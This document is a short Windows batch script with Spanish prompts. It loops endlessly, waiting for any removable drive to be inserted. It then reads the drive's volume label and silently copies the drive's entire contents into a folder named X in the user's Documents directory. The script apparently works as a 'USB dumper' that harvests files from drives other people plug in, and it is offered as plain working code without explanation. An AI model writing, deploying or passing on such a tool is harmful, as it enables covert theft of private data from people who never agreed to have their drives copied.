
@echo off

:USB

echo Esperando usb... 

for %%u in (a, b, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z) do (
        dir /b %%u:\ > nul 2>&1 && (
           for /f "tokens=8*" %%a in ('vol %%u: ^| find "volumen de la unidad"') do (echo Unidad %%u:\ "%%a" detectada

if exist "%userprofile%\Documents\X\%%u-%%a" (goto USB) else (xcopy /s /c /i "%%u:"\*.* %userprofile%\Documents\X\"%%u-%%a" & goto USB)
    )
  )
)

goto USB
exit
